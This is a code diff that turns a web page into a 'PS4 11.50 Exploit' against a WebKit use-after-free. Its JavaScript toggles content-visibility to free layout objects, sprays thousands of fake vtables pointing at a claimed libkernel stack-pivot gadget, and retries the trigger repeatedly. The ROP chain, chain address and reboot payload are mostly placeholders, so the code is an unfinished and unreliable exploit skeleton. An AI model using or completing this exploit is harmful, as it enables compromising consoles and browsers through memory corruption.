@@ -1,12 +1,12 @@
+// index.html
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>WebKit UAF - Layer Tree Exploit</title>
+  <meta charset="utf-8">
+  <title>PS4 11.50 Exploit</title>
   <style>
     .container {
       content-visibility: hidden;
-      contain: layout style;
     }
     .child {
       width: 100px;
@@ -19,8 +19,150 @@
   <div class="container" id="container">
     <div class="child" id="child"></div>
   </div>
-
-  <script src="utils.js"></script>
+  <script src="int64.js"></script>
+  <script src="rop.js"></script>
+  <script src="payload.js"></script>
   <script src="exploit.js"></script>
 </body>
 </html>
+
+// int64.js
+function Int64(lo, hi) {
+  this.lo = lo >>> 0;
+  this.hi = hi >>> 0;
+}
+
+Int64.prototype.toString = function () {
+  return '0x' + this.hi.toString(16).padStart(8, '0') + this.lo.toString(16).padStart(8, '0');
+};
+
+Int64.prototype.asDouble = function () {
+  var buffer = new ArrayBuffer(8);
+  var u32 = new Uint32Array(buffer);
+  u32[0] = this.lo;
+  u32[1] = this.hi;
+  return new Float64Array(buffer)[0];
+};
+
+Int64.fromDouble = function (d) {
+  var buffer = new ArrayBuffer(8);
+  new Float64Array(buffer)[0] = d;
+  var u32 = new Uint32Array(buffer);
+  return new Int64(u32[0], u32[1]);
+};
+
+// rop.js
+let ropChain = null;
+
+function setupROP() {
+  ropChain = new Uint32Array(0x400);
+  let i = 0;
+
+  // Fill with dummy values for now
+  for (; i < ropChain.length; i++) {
+    ropChain[i] = 0x90909090;
+  }
+
+  debug_log("ROP chain initialized.");
+  return ropChain;
+}
+
+function getROPChainAddr() {
+  // Assume WebKit heap places this predictably for now
+  return 0x133713370000; // Placeholder
+}
+
+// payload.js
+function run_payload() {
+  debug_log("Running minimal test payload...");
+
+  const SYSCALL_REBOOT = 0x81; // Placeholder for reboot syscall ID on PS4 (may differ)
+
+  // In real chain, set up registers and call syscall
+  setupROP();
+
+  debug_log("Payload logic complete.");
+}
+
+// exploit.js
+const container = document.getElementById("container");
+
+let sprayBuffers = [];
+
+function debug_log(msg) {
+  const el = document.createElement("pre");
+  el.textContent = msg;
+  document.body.appendChild(el);
+}
+
+function forceLayout(element) {
+  void element.offsetHeight;
+}
+
+function sprayFakeVtables() {
+  sprayBuffers = [];
+
+  const GADGET_ADDR = 0x82619098; // PS4 11.50 stack pivot gadget (libkernel)
+  const MARKER = 0x13371337;
+
+  for (let i = 0; i < 10000; i++) {
+    const buf = new ArrayBuffer(0x100);
+    const view = new DataView(buf);
+
+    view.setUint32(0x00, GADGET_ADDR, true); // vtable ptr (low bits only for now)
+    view.setUint32(0x08, MARKER, true);      // marker
+
+    sprayBuffers.push(view);
+  }
+
+  debug_log("Fake vtables sprayed.");
+}
+
+function triggerUAF() {
+  debug_log("Triggering UAF...");
+
+  const newChild = document.createElement("div");
+  newChild.className = "child";
+  container.appendChild(newChild);
+
+  container.style.contentVisibility = "hidden";
+  forceLayout(container);
+
+  newChild.remove();
+
+  setTimeout(() => {
+    container.style.contentVisibility = "auto";
+    forceLayout(container);
+
+    const tmp = document.createElement("div");
+    container.appendChild(tmp);
+    container.removeChild(tmp);
+
+    sprayFakeVtables();
+
+    setTimeout(() => {
+      run_payload();
+    }, 200);
+  }, 50);
+}
+
+setInterval(() => {
+  debug_log("=== Retrying UAF exploit ===");
+  triggerUAF();
+}, 1000);
+
+const observer = new MutationObserver(() => {
+  debug_log("MutationObserver fired.");
+  triggerUAF();
+});
+observer.observe(container, { childList: true, subtree: true });
+
+window.onload = () => {
+  debug_log("Page loaded. Starting mutation...");
+
+  setTimeout(() => {
+    const tmp = document.createElement("div");
+    container.appendChild(tmp);
+    container.removeChild(tmp);
+  }, 200);
+};
